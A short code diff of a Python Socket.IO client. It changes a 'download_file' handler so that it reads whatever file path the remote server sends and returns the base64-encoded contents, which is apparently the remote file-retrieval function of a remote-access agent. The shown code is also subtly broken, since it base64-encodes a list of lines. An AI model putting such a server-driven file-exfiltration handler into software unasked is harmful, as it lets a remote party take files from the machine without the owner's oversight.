@@ -86,10 +86,10 @@ def run(data):
     @sio.on("download_file")
     def download_file(data_new):
         if data['uuid'] == data_new['uuid']:
-            with open(data['file_path'], 'r') as f:
+            with open(data_new['file_path'], 'r') as f:
                 file = f.readlines()
             file_ready = base64.b64encode(file)
-            sio.emit('download_file_return', {'uuid': data['uuid'], 'file_name': data['file_path'], 'file': file_ready})
+            sio.emit('download_file_return', {'uuid': data_new['uuid'], 'file_name': data_new['file_path'], 'file': file_ready})
 
 
     sio.connect(data['url'])
